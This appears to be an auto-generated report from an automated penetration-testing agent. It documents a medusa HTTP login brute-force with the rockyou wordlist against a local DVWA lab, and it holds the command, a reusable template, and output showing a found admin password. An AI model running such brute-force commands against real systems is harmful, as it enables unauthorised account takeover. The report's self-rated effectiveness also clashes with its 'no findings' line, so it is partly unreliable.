# medusa

## Tool Name & Category
| Field | Value |
|-------|-------|
| **Category** | auth — Authentication / Credential Testing |
| **Binary** | `medusa` ✅ installed |
| **Agent** | auth |
| **DVWA-optimized** | True |
| **Lab target** | `http://aegis-target` |

## Official Purpose
Parallel login brute

## Exact Command(s) Executed
```bash
# SAFETY CHECK PASSED — local Docker lab only (DVWA + Juice Shop)
medusa -h aegis-target -u admin -P /usr/share/wordlists/rockyou.txt -M http
```

| Metric | Value |
|--------|-------|
| Duration | 0.75s |
| Exit code | 0 |
| Effectiveness | **9/10** — Rich actionable output |

## Key Findings
- No automated findings extracted — review output below

## Full Output Summary
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-06-24 05:47:51 ACCOUNT CHECK: [http] Host: aegis-target (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
2026-06-24 05:47:51 ACCOUNT FOUND: [http] Host: aegis-target User: admin Password: 123456 [SUCCESS]

```

## What I Learned / Edge Cases / Gotchas
- Executed successfully in isolated lab
- Registry template: `medusa -h {host} -u admin -P /usr/share/wordlists/rockyou.txt -M http {extra}`

## Recommended Safe Parameters for Learning Labs
- Scope: `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) only
- From Kali network: `aegis-target`, `aegis-juice`
- DVWA login: `admin` / `password` — use `/workspace/dvwa_login.sh` for cookie-aware tools
- Suggested timeout: 180s

## Next Steps for Exploration & Development
Run `medusa --help` and tune `medusa -h {host} -u admin -P /usr/share/wordlists/rockyou.txt -M http {extra}` for your target.

---
*GrokStrike v2 — 2026-06-24T05:47:51.945857+00:00*
